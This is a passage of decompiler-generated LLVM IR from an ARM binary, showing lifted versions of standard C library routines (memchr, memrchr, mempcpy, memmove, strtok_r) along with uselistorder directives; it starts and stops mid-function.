  uselistorder i32 %v0_17fac75, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_17f5c, { 1, 0 }
  uselistorder i32 %v0_17f5c, { 3, 1, 0, 2 }
  uselistorder i32 %v2_17f54, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_17f54, { 1, 0, 2 }
  uselistorder i32 %v0_17f54, { 2, 0, 1, 3 }
  uselistorder i32 %v0_17fac76, { 2, 1, 0 }
  uselistorder i32 %v1_17f34, { 1, 0, 2 }
  uselistorder i32 %v1_17f0c, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_17f0c, { 1, 2, 0, 3 }
  uselistorder i32 %v8_17ef8, { 1, 0, 2 }
  uselistorder i32 %v6_17ef4, { 1, 0 }
  uselistorder i32 %v2_17eec, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_17eec, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_17efc, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v4_17ee4, { 0, 2, 1 }
  uselistorder i1 %v0_17ee4, { 1, 0 }
  uselistorder i1 %v1_17ee4, { 1, 0 }
  uselistorder i32 %v3_17ee0, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_17ed8, { 0, 2, 1, 3 }
  uselistorder i32 %v4_17ec4, { 1, 0 }
  uselistorder i32 %v12_17eb8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_17eac, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_17eb0, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v2_17ea0, { 0, 2, 1 }
  uselistorder i32 %v2_17e98, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_17e98, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 %v1_17e90, { 1, 0 }
  uselistorder i32 %v1_17e88, { 2, 1, 0 }
  uselistorder i32 %v2_17e80, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v0_17e80, { 1, 0, 2, 3 }
  uselistorder i32 %v2_17e70, { 1, 0 }
  uselistorder i32 %v1_17e70, { 1, 5, 3, 4, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_17e70, { 1, 7, 9, 8, 6, 4, 0, 5, 11, 2, 3, 10, 12 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 15, 16, 17, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 24, 25, 26, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i32* %r3.global-to-local, { 0, 9, 1, 2, 3, 10, 4, 5, 6, 11, 7, 8, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 39, 40, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38 }
  uselistorder i32* %r2.global-to-local, { 0, 30, 1, 2, 3, 4, 5, 31, 6, 7, 8, 9, 10, 32, 11, 12, 13, 14, 15, 33, 16, 18, 17, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 34, 64, 65, 66, 67, 68, 69, 35, 60, 36, 37, 38, 39, 40, 61, 41, 42, 43, 44, 45, 62, 46, 48, 47, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 63 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 12, 1, 3, 6, 4, 13, 5, 7, 10, 8, 14, 9, 11, 15, 16, 17, 34, 32, 35, 33, 36, 20, 18, 26, 19, 21, 24, 22, 27, 23, 25, 28, 29, 30, 31 }
  uselistorder i32* %r0.global-to-local, { 3, 25, 4, 5, 26, 6, 7, 27, 8, 9, 10, 11, 12, 13, 28, 14, 16, 15, 17, 18, 29, 19, 20, 30, 21, 22, 23, 24, 31, 57, 59, 60, 32, 39, 33, 34, 40, 35, 36, 37, 38, 41, 42, 0, 43, 44, 46, 45, 47, 48, 58, 49, 50, 51, 54, 52, 53, 55, 56, 1, 2 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 12, 13, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 0, 41, 1, 24, 2, 25, 42, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 3, 22, 23, 24, 25, 26, 0, 47, 1, 27, 2, 28, 48, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 2147483632, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 -5, { 1, 0, 2 }
  uselistorder i32 -12, { 1, 13, 14, 2, 16, 17, 3, 18, 19, 15, 12, 11, 10, 9, 8, 20, 21, 22, 4, 5, 6, 23, 7, 24, 25, 27, 28, 29, 26, 0 }
  uselistorder i32 -16, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 6, 5, 4, 1, 16, 17, 18, 19, 20, 21, 3, 2, 0, 22 }
  uselistorder i32 27, { 1, 0, 2 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder i32 -8, { 13, 14, 15, 16, 17, 18, 12, 11, 5, 10, 9, 8, 7, 19, 20, 21, 22, 6, 23, 24, 3, 0, 28, 25, 26, 27, 2, 29, 30, 4, 1 }
  uselistorder label %dec_label_pc_182d8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1826c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18200, { 2, 0, 1 }
  uselistorder label %dec_label_pc_181a0, { 1, 0 }
  uselistorder label %.thread26, { 2, 0, 1 }
  uselistorder label %.thread122, { 1, 0 }
  uselistorder label %bb143, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_1812c, { 1, 0 }
  uselistorder label %.thread16, { 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_180f0, { 1, 0 }
  uselistorder label %dec_label_pc_180dc, { 1, 0 }
  uselistorder label %dec_label_pc_1809c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18030, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17fc4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17f64, { 1, 0 }
  uselistorder label %.thread12, { 2, 0, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %.thread120, { 1, 0 }
  uselistorder label %bb133, { 4, 6, 5, 1, 7, 0, 2, 3 }
  uselistorder label %.thread118, { 1, 0 }
  uselistorder label %dec_label_pc_17ed8, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_17e98, { 1, 0 }
}

define i32 @function_182f8(i32 %arg1) local_unnamed_addr {
dec_label_pc_182f8:
  ret i32 %arg1
}

define i32 @memmove(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_18300 = load i32, i32* @r0, align 4
  %v1_18300 = load i32, i32* @r1, align 4
  %v2_18300 = inttoptr i32 %v0_18300 to i8*
  %v3_18300 = call i32 @_memcpy(i8* %v2_18300, i32 %v1_18300)
  ret i32 %v3_18300

; uselistorder directives
  uselistorder i32 (i8*, i32)* @_memcpy, { 0, 2, 1 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_18310 = load i32, i32* @r4, align 4
  %v6_18310 = load i32, i32* @r5, align 4
  %v9_18310 = load i32, i32* @r6, align 4
  %v1_18314 = urem i32 %arg1, 256
  %v0_1833018 = load i32, i32* @r2, align 4
  %v2_1833020 = icmp eq i32 %v0_1833018, 0
  br i1 %v2_1833020, label %dec_label_pc_18340, label %dec_label_pc_18338

dec_label_pc_1831c:                               ; preds = %dec_label_pc_18338
  %v3_1831c = load i8, i8* %.021, align 1
  %v4_1831c = zext i8 %v3_1831c to i32
  %v9_18320 = icmp eq i32 %v4_1831c, %v1_18314
  %v1_18324 = add i32 %v0_18324, -1
  br i1 %v9_18320, label %bb, label %dec_label_pc_18330

bb:                                               ; preds = %dec_label_pc_1831c
  ret i32 %v1_18338

dec_label_pc_18330:                               ; preds = %dec_label_pc_1831c
  %v2_1832c = add i32 %v1_18338, 1
  %v3_1832c = inttoptr i32 %v2_1832c to i8*
  %v2_18330 = icmp eq i32 %v1_18324, 0
  br i1 %v2_18330, label %dec_label_pc_18340, label %dec_label_pc_18338

dec_label_pc_18338:                               ; preds = %entry, %dec_label_pc_18330
  %v0_18324 = phi i32 [ %v1_18324, %dec_label_pc_18330 ], [ %v0_1833018, %entry ]
  %.021 = phi i8* [ %v3_1832c, %dec_label_pc_18330 ], [ undef, %entry ]
  %v1_18338 = ptrtoint i8* %.021 to i32
  %v2_18338 = urem i32 %v1_18338, 4
  %v3_18338 = icmp eq i32 %v2_18338, 0
  br i1 %v3_18338, label %dec_label_pc_18340, label %dec_label_pc_1831c

dec_label_pc_18340:                               ; preds = %dec_label_pc_18330, %dec_label_pc_18338, %entry
  %v0_183cc37 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_18330 ], [ %v0_18324, %dec_label_pc_18338 ]
  %.0.lcssa = phi i8* [ undef, %entry ], [ %v3_1832c, %dec_label_pc_18330 ], [ %.021, %dec_label_pc_18338 ]
  %v4_18340 = mul nuw nsw i32 %v1_18314, 256
  %v5_18340 = or i32 %v4_18340, %v1_18314
  %v1_18344 = ptrtoint i8* %.0.lcssa to i32
  %v4_18348 = mul i32 %v5_18340, 65536
  %v5_18348 = or i32 %v4_18348, %v5_18340
  store i32 -2130640640, i32* @lr, align 4
  %tmp = icmp ugt i32 %v0_183cc37, 3
  br i1 %tmp, label %dec_label_pc_18350, label %dec_label_pc_183f4.preheader

dec_label_pc_18350:                               ; preds = %dec_label_pc_18340, %dec_label_pc_183cc.backedge
  %v0_1836c82 = phi i32 [ %v1_1836c, %dec_label_pc_183cc.backedge ], [ %v0_183cc37, %dec_label_pc_18340 ]
  %v0_1835081 = phi i32 [ %v4_18350, %dec_label_pc_183cc.backedge ], [ %v1_18344, %dec_label_pc_18340 ]
  %v1_18350 = inttoptr i32 %v0_1835081 to i32*
  %v2_18350 = load i32, i32* %v1_18350, align 4
  %v4_18350 = add i32 %v0_1835081, 4
  %v2_18354 = xor i32 %v2_18350, %v5_18348
  %v2_18358 = add i32 %v2_18354, 2130640639
  %v1_1835c = sub i32 -1, %v2_18354
  %v2_18360 = xor i32 %v2_18358, %v1_1835c
  %v2_18364 = and i32 %v2_18360, -2130640640
  %v2_18368 = icmp eq i32 %v2_18364, 0
  %v1_1836c = add i32 %v0_1836c82, -4
  br i1 %v2_18368, label %dec_label_pc_183cc.backedge, label %dec_label_pc_18374

dec_label_pc_183cc.backedge:                      ; preds = %dec_label_pc_18350, %dec_label_pc_183b8
  store i32 -2130640640, i32* @lr, align 4
  %tmp107 = icmp ugt i32 %v1_1836c, 3
  br i1 %tmp107, label %dec_label_pc_18350, label %dec_label_pc_183f4.preheader

dec_label_pc_18374:                               ; preds = %dec_label_pc_18350
  %v2_18374 = inttoptr i32 %v0_1835081 to i8*
  %v3_18374 = load i8, i8* %v2_18374, align 1
  %v4_18374 = zext i8 %v3_18374 to i32
  %v9_1837c = icmp eq i32 %v4_18374, %v1_18314
  %v1_18380 = add i32 %v0_1835081, 3
  %v1_18384 = add i32 %v0_1835081, 1
  store i32 %v1_18384, i32* @lr, align 4
  %v1_18388 = add i32 %v0_1835081, 2
  br i1 %v9_1837c, label %bb50, label %bb51

bb50:                                             ; preds = %dec_label_pc_18374
  store i32 %v3_18310, i32* @r4, align 4
  store i32 %v6_18310, i32* @r5, align 4
  store i32 %v9_18310, i32* @r6, align 4
  ret i32 %v0_1835081

bb51:                                             ; preds = %dec_label_pc_18374
  %v2_18390 = inttoptr i32 %v1_18384 to i8*
  %v3_18390 = load i8, i8* %v2_18390, align 1
  %v4_18390 = zext i8 %v3_18390 to i32
  %v9_18394 = icmp eq i32 %v4_18390, %v1_18314
  br i1 %v9_18394, label %dec_label_pc_1839c, label %dec_label_pc_183a4

dec_label_pc_1839c:                               ; preds = %bb51
  store i32 %v3_18310, i32* @r4, align 4
  store i32 %v6_18310, i32* @r5, align 4
  store i32 %v9_18310, i32* @r6, align 4
  ret i32 %v1_18384

dec_label_pc_183a4:                               ; preds = %bb51
  %v2_183a4 = inttoptr i32 %v1_18388 to i8*
  %v3_183a4 = load i8, i8* %v2_183a4, align 1
  %v4_183a4 = zext i8 %v3_183a4 to i32
  %v9_183a8 = icmp eq i32 %v4_183a4, %v1_18314
  br i1 %v9_183a8, label %dec_label_pc_183b0, label %dec_label_pc_183b8

dec_label_pc_183b0:                               ; preds = %dec_label_pc_183a4
  store i32 %v3_18310, i32* @r4, align 4
  store i32 %v6_18310, i32* @r5, align 4
  store i32 %v9_18310, i32* @r6, align 4
  ret i32 %v1_18388

dec_label_pc_183b8:                               ; preds = %dec_label_pc_183a4
  %v2_183b8 = inttoptr i32 %v1_18380 to i8*
  %v3_183b8 = load i8, i8* %v2_183b8, align 1
  %v4_183b8 = zext i8 %v3_183b8 to i32
  %v9_183bc = icmp eq i32 %v4_183b8, %v1_18314
  br i1 %v9_183bc, label %dec_label_pc_183c4, label %dec_label_pc_183cc.backedge

dec_label_pc_183c4:                               ; preds = %dec_label_pc_183b8
  store i32 %v3_18310, i32* @r4, align 4
  store i32 %v6_18310, i32* @r5, align 4
  store i32 %v9_18310, i32* @r6, align 4
  ret i32 %v1_18380

dec_label_pc_183f4.preheader:                     ; preds = %dec_label_pc_183cc.backedge, %dec_label_pc_18340
  %v0_18350.lcssa = phi i32 [ %v1_18344, %dec_label_pc_18340 ], [ %v4_18350, %dec_label_pc_183cc.backedge ]
  %v0_1836c.lcssa = phi i32 [ %v0_183cc37, %dec_label_pc_18340 ], [ %v1_1836c, %dec_label_pc_183cc.backedge ]
  %v2_183f411 = icmp eq i32 %v0_1836c.lcssa, 0
  br i1 %v2_183f411, label %dec_label_pc_183fc, label %dec_label_pc_183e4

dec_label_pc_183e4:                               ; preds = %dec_label_pc_183f4, %dec_label_pc_183f4.preheader
  %v0_183f4.in = phi i32 [ %v0_183f4, %dec_label_pc_183f4 ], [ %v0_1836c.lcssa, %dec_label_pc_183f4.preheader ]
  %v15_183ec = phi i32 [ %v1_183f0, %dec_label_pc_183f4 ], [ %v0_18350.lcssa, %dec_label_pc_183f4.preheader ]
  %v0_183f4 = add i32 %v0_183f4.in, -1
  %v1_183e4 = inttoptr i32 %v15_183ec to i8*
  %v2_183e4 = load i8, i8* %v1_183e4, align 1
  %v3_183e4 = zext i8 %v2_183e4 to i32
  %v9_183e8 = icmp eq i32 %v3_183e4, %v1_18314
  br i1 %v9_183e8, label %bb52, label %dec_label_pc_183f4

bb52:                                             ; preds = %dec_label_pc_183e4
  store i32 %v3_18310, i32* @r4, align 4
  store i32 %v6_18310, i32* @r5, align 4
  store i32 %v9_18310, i32* @r6, align 4
  ret i32 %v15_183ec

dec_label_pc_183f4:                               ; preds = %dec_label_pc_183e4
  %v1_183f0 = add i32 %v15_183ec, 1
  %v2_183f4 = icmp eq i32 %v0_183f4, 0
  br i1 %v2_183f4, label %dec_label_pc_183fc, label %dec_label_pc_183e4

dec_label_pc_183fc:                               ; preds = %dec_label_pc_183f4, %dec_label_pc_183f4.preheader
  store i32 %v3_18310, i32* @r4, align 4
  store i32 %v6_18310, i32* @r5, align 4
  store i32 %v9_18310, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v15_183ec, { 1, 0, 2 }
  uselistorder i32 %v1_1836c, { 1, 0, 2 }
  uselistorder i32 %v0_1835081, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v5_18340, { 1, 0 }
  uselistorder i32 %v0_183cc37, { 1, 2, 0 }
  uselistorder i32 %v1_18314, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %v3_18310, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* undef, { 1, 0, 2 }
  uselistorder label %dec_label_pc_183cc.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_18350, { 1, 0 }
  uselistorder label %dec_label_pc_18340, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18338, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_18418 = call i32 @memcpy()
  %v0_1841c = load i32, i32* @r5, align 4
  %v1_1841c = load i32, i32* @r4, align 4
  %v2_1841c = add i32 %v1_1841c, %v0_1841c
  ret i32 %v2_1841c
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_18424 = load i32, i32* @r4, align 4
  %v1_18428 = urem i32 %arg2, 256
  %v2_1842c = add i32 %arg3, %arg1
  %v2_184442 = icmp eq i32 %arg3, 0
  br i1 %v2_184442, label %dec_label_pc_18454, label %dec_label_pc_1844c

dec_label_pc_18434:                               ; preds = %dec_label_pc_1844c
  %v1_18434 = add i32 %v0_18434, -1
  %v2_18434 = inttoptr i32 %v1_18434 to i8*
  %v3_18434 = load i8, i8* %v2_18434, align 1
  %v4_18434 = zext i8 %v3_18434 to i32
  %v9_18438 = icmp eq i32 %v4_18434, %v1_18428
  br i1 %v9_18438, label %bb, label %dec_label_pc_18444

bb:                                               ; preds = %dec_label_pc_18434
  ret i32 %v1_18434

dec_label_pc_18444:                               ; preds = %dec_label_pc_18434
  %v1_18440 = add i32 %v0_18440, -1
  %v2_18444 = icmp eq i32 %v1_18440, 0
  br i1 %v2_18444, label %dec_label_pc_18454, label %dec_label_pc_1844c

dec_label_pc_1844c:                               ; preds = %entry, %dec_label_pc_18444
  %v0_18440 = phi i32 [ %v1_18440, %dec_label_pc_18444 ], [ %arg3, %entry ]
  %v0_18434 = phi i32 [ %v1_18434, %dec_label_pc_18444 ], [ %v2_1842c, %entry ]
  %v1_1844c = urem i32 %v0_18434, 4
  %v2_1844c = icmp eq i32 %v1_1844c, 0
  br i1 %v2_1844c, label %dec_label_pc_18454, label %dec_label_pc_18434

dec_label_pc_18454:                               ; preds = %dec_label_pc_18444, %dec_label_pc_1844c, %entry
  %v0_184ec11 = phi i32 [ %v2_1842c, %entry ], [ %v1_18434, %dec_label_pc_18444 ], [ %v0_18434, %dec_label_pc_1844c ]
  %v0_184d87 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_18444 ], [ %v0_18440, %dec_label_pc_1844c ]
  %v4_18454 = mul nuw nsw i32 %v1_18428, 256
  %v5_18454 = or i32 %v4_18454, %v1_18428
  %v4_18458 = mul i32 %v5_18454, 65536
  %v5_18458 = or i32 %v4_18458, %v5_18454
  store i32 -2130640640, i32* @lr, align 4
  %tmp = icmp ugt i32 %v0_184d87, 3
  br i1 %tmp, label %dec_label_pc_18460, label %dec_label_pc_184e8

dec_label_pc_18460:                               ; preds = %dec_label_pc_18454, %.backedge.backedge
  %v0_1847c51 = phi i32 [ %v1_1847c, %.backedge.backedge ], [ %v0_184d87, %dec_label_pc_18454 ]
  %v0_1846050 = phi i32 [ %v1_18460, %.backedge.backedge ], [ %v0_184ec11, %dec_label_pc_18454 ]
  %v1_18460 = add i32 %v0_1846050, -4
  %v2_18460 = inttoptr i32 %v1_18460 to i32*
  %v3_18460 = load i32, i32* %v2_18460, align 4
  %v2_18464 = xor i32 %v3_18460, %v5_18458
  %v2_18468 = add i32 %v2_18464, 2130640639
  %v1_1846c = sub i32 -1, %v2_18464
  %v2_18470 = xor i32 %v2_18468, %v1_1846c
  %v2_18474 = and i32 %v2_18470, -2130640640
  %v2_18478 = icmp eq i32 %v2_18474, 0
  %v1_1847c = add i32 %v0_1847c51, -4
  br i1 %v2_18478, label %.backedge.backedge, label %dec_label_pc_18484

dec_label_pc_18484:                               ; preds = %dec_label_pc_18460
  %v1_18484 = add i32 %v0_1846050, -1
  %v2_18484 = inttoptr i32 %v1_18484 to i8*
  %v3_18484 = load i8, i8* %v2_18484, align 1
  %v4_18484 = zext i8 %v3_18484 to i32
  %v9_18488 = icmp eq i32 %v4_18484, %v1_18428
  %v1_1848c = add i32 %v0_1846050, -2
  %v1_18494 = add i32 %v0_1846050, -3
  store i32 %v1_18494, i32* @lr, align 4
  br i1 %v9_18488, label %dec_label_pc_1849c, label %dec_label_pc_184a4

dec_label_pc_1849c:                               ; preds = %dec_label_pc_18484
  store i32 %v3_18424, i32* @r4, align 4
  ret i32 %v1_18484

dec_label_pc_184a4:                               ; preds = %dec_label_pc_18484
  %v2_184a4 = inttoptr i32 %v1_1848c to i8*
  %v3_184a4 = load i8, i8* %v2_184a4, align 1
  %v4_184a4 = zext i8 %v3_184a4 to i32
  %v9_184a8 = icmp eq i32 %v4_184a4, %v1_18428
  br i1 %v9_184a8, label %dec_label_pc_184b0, label %dec_label_pc_184b8

dec_label_pc_184b0:                               ; preds = %dec_label_pc_184a4
  store i32 %v3_18424, i32* @r4, align 4
  ret i32 %v1_1848c

dec_label_pc_184b8:                               ; preds = %dec_label_pc_184a4
  %v2_184b8 = inttoptr i32 %v1_18494 to i8*
  %v3_184b8 = load i8, i8* %v2_184b8, align 1
  %v4_184b8 = zext i8 %v3_184b8 to i32
  %v9_184bc = icmp eq i32 %v4_184b8, %v1_18428
  br i1 %v9_184bc, label %dec_label_pc_184c4, label %dec_label_pc_184cc

dec_label_pc_184c4:                               ; preds = %dec_label_pc_184b8
  store i32 %v3_18424, i32* @r4, align 4
  ret i32 %v1_18494

dec_label_pc_184cc:                               ; preds = %dec_label_pc_184b8
  %v1_184cc = inttoptr i32 %v1_18460 to i8*
  %v2_184cc = load i8, i8* %v1_184cc, align 1
  %v3_184cc = zext i8 %v2_184cc to i32
  %v9_184d0 = icmp eq i32 %v3_184cc, %v1_18428
  br i1 %v9_184d0, label %bb19, label %.backedge.backedge

.backedge.backedge:                               ; preds = %dec_label_pc_184cc, %dec_label_pc_18460
  store i32 -2130640640, i32* @lr, align 4
  %tmp70 = icmp ugt i32 %v1_1847c, 3
  br i1 %tmp70, label %dec_label_pc_18460, label %dec_label_pc_184e8

bb19:                                             ; preds = %dec_label_pc_184cc
  store i32 %v3_18424, i32* @r4, align 4
  ret i32 %v1_18460

dec_label_pc_184ec:                               ; preds = %dec_label_pc_184e8
  %v1_184f8 = add i32 %v0_184f8, -1
  %v1_184ec = add i32 %v0_184ec, -1
  %v2_184ec = inttoptr i32 %v1_184ec to i8*
  %v3_184ec = load i8, i8* %v2_184ec, align 1
  %v4_184ec = zext i8 %v3_184ec to i32
  %v9_184f0 = icmp eq i32 %v4_184ec, %v1_18428
  br i1 %v9_184f0, label %bb20, label %dec_label_pc_184e8

bb20:                                             ; preds = %dec_label_pc_184ec
  store i32 %v3_18424, i32* @r4, align 4
  ret i32 %v1_184ec

dec_label_pc_184e8:                               ; preds = %dec_label_pc_18454, %.backedge.backedge, %dec_label_pc_184ec
  %v0_184ec = phi i32 [ %v1_184ec, %dec_label_pc_184ec ], [ %v0_184ec11, %dec_label_pc_18454 ], [ %v1_18460, %.backedge.backedge ]
  %v0_184f8 = phi i32 [ %v1_184f8, %dec_label_pc_184ec ], [ %v0_184d87, %dec_label_pc_18454 ], [ %v1_1847c, %.backedge.backedge ]
  %v2_184f8 = icmp eq i32 %v0_184f8, 0
  br i1 %v2_184f8, label %dec_label_pc_18500, label %dec_label_pc_184ec

dec_label_pc_18500:                               ; preds = %dec_label_pc_184e8
  store i32 %v3_18424, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_184f8, { 1, 0 }
  uselistorder i32 %v1_1847c, { 1, 0, 2 }
  uselistorder i32 %v1_18460, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_1846050, { 3, 2, 1, 0 }
  uselistorder i32 %v5_18454, { 1, 0 }
  uselistorder i32 %v0_184d87, { 1, 2, 0 }
  uselistorder i32 %v0_18434, { 1, 0, 2 }
  uselistorder i32 %v1_18434, { 0, 2, 1, 3 }
  uselistorder i32 %v2_1842c, { 1, 0 }
  uselistorder i32 %v1_18428, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %v3_18424, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 -3, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32 -2, { 2, 4, 5, 3, 13, 7, 6, 12, 8, 14, 16, 15, 17, 0, 9, 1, 10, 18, 11 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_184e8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18460, { 1, 0 }
  uselistorder label %dec_label_pc_18454, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1844c, { 1, 0 }
}

define i32 @strtok_r() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_18510 = load i32, i32* @r4, align 4
  store i32 %v3_18510, i32* %stack_var_-16, align 4
  %v6_18510 = load i32, i32* @r5, align 4
  %v0_18514 = load i32, i32* @r0, align 4
  store i32 %v0_18514, i32* %r4.global-to-local, align 4
  %v2_18514 = icmp eq i32 %v0_18514, 0
  %v1_18518 = load i32, i32* @r2, align 4
  br i1 %v2_18514, label %bb, label %entry._crit_edge

bb:                                               ; preds = %entry
  %v2_18518 = inttoptr i32 %v1_18518 to i32*
  %v3_18518 = load i32, i32* %v2_18518, align 4
  store i32 %v3_18518, i32* %r4.global-to-local, align 4
  br label %entry._crit_edge

entry._crit_edge:                                 ; preds = %entry, %bb
  %v0_1851c = phi i32 [ %v3_18518, %bb ], [ %v0_18514, %entry ]
  store i32 %v0_1851c, i32* @r0, align 4
  store i32 %v1_18518, i32* @r5, align 4
  %v0_18524 = load i32, i32* @r1, align 4
  store i32 %v0_18524, i32* %r6.global-to-local, align 4
  %v1_18528 = inttoptr i32 %v0_1851c to i8*
  %v2_18528 = call i32 @__GI_strspn(i8* %v1_18528)
  %v0_1852c = load i32, i32* %r4.global-to-local, align 4
  %v2_1852c = add i32 %v0_1852c, %v2_18528
  %v3_1852c = inttoptr i32 %v2_1852c to i8*
  %v4_1852c = load i8, i8* %v3_1852c, align 1
  %v6_1852c = zext i8 %v4_1852c to i32
  store i32 %v6_1852c, i32* %r3.global-to-local, align 4
  store i32 %v2_1852c, i32* @r4, align 4
  %v2_18534 = icmp eq i8 %v4_1852c, 0
  store i1 %v2_18534, i1* @cpsr_z, align 1
  %v0_18538 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_18538, i32* @r1, align 4
  store i32 %v2_1852c, i32* @r0, align 4
  br i1 %v2_18534, label %bb7, label %dec_label_pc_18548

bb7:                                              ; preds = %entry._crit_edge
  %v2_18540 = load i32, i32* @r5, align 4
  %v3_18540 = inttoptr i32 %v2_18540 to i32*
  store i32 %v2_1852c, i32* %v3_18540, align 4
  br label %dec_label_pc_1857c

dec_label_pc_18548:                               ; preds = %entry._crit_edge
  %v0_18548 = call i32 @__GI_strpbrk()
  store i32 %v0_18548, i32* %r2.global-to-local, align 4
  %v3_1854c = icmp eq i32 %v0_18548, 0
  store i1 %v3_1854c, i1* @cpsr_z, align 1
  br i1 %v3_1854c, label %dec_label_pc_1855c, label %dec_label_pc_1856c

dec_label_pc_1855c:                               ; preds = %dec_label_pc_18548
  %v0_18554 = load i32, i32* @r4, align 4
  %v2_1855c = call i32 @rawmemchr(i32 %v0_18554, i32 0)
  %v0_18560 = load i32, i32* @r4, align 4
  store i32 %v0_18560, i32* %r3.global-to-local, align 4
  %v1_18564 = load i32, i32* @r5, align 4
  %v2_18564 = inttoptr i32 %v1_18564 to i32*
  store i32 %v2_1855c, i32* %v2_18564, align 4
  br label %dec_label_pc_1857c

dec_label_pc_1856c:                               ; preds = %dec_label_pc_18548
  %v3_18570 = inttoptr i32 %v0_18548 to i8*
  store i8 0, i8* %v3_18570, align 1
  %v4_18570 = load i32, i32* %r2.global-to-local, align 4
  %v5_18570 = add i32 %v4_18570, 1
  store i32 %v5_18570, i32* @r2, align 4
  %v1_18574 = load i32, i32* @r5, align 4
  %v2_18574 = inttoptr i32 %v1_18574 to i32*
  store i32 %v5_18570, i32* %v2_18574, align 4
  %v0_18578 = load i32, i32* @r4, align 4
  store i32 %v0_18578, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1857c

dec_label_pc_1857c:                               ; preds = %bb7, %dec_label_pc_1855c, %dec_label_pc_1856c
  %v0_1857c = load i32, i32* %r3.global-to-local, align 4
  %v2_18580 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18580, i32* @r4, align 4
  store i32 %v6_18510, i32* @r5, align 4
  ret i32 %v0_1857c

; uselistorder directives
  uselistorder i32 %v0_1851c, { 1, 0 }
  uselistorder i32 %v0_18514, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
